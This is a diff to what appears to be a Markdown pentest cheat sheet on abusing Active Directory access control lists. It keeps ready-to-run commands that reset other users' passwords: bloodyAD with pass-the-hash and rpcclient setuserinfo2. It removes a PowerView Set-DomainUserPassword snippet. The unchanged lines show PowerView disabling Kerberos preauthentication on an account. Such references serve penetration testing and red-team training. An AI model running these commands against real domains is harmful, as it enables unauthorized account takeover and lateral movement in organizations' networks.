@@ -134,28 +134,15 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
   PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
   PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
   ```
-#### From Linux
-* Windows/Linux:
 
-  ```ps1
+#### From Linux
+* **BloodyAD PTH**  
+  ```bash
   # Using bloodyAD with pass-the-hash
   bloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password john.doe 'Password123!'
   ```
-
-* Windows only:
-
-  ```ps1
-  # https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
-  $user = 'DOMAIN\user1'; 
-  $pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; 
-  $creds = New-Object System.Management.Automation.PSCredential $user, $pass;
-  $newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; 
-  Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
-  ```
-
-* Linux only:
-
-  ```ps1
+* **Using rpcclient**  
+  ```bash
   # Using rpcclient from the  Samba software suite
   rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
   ```
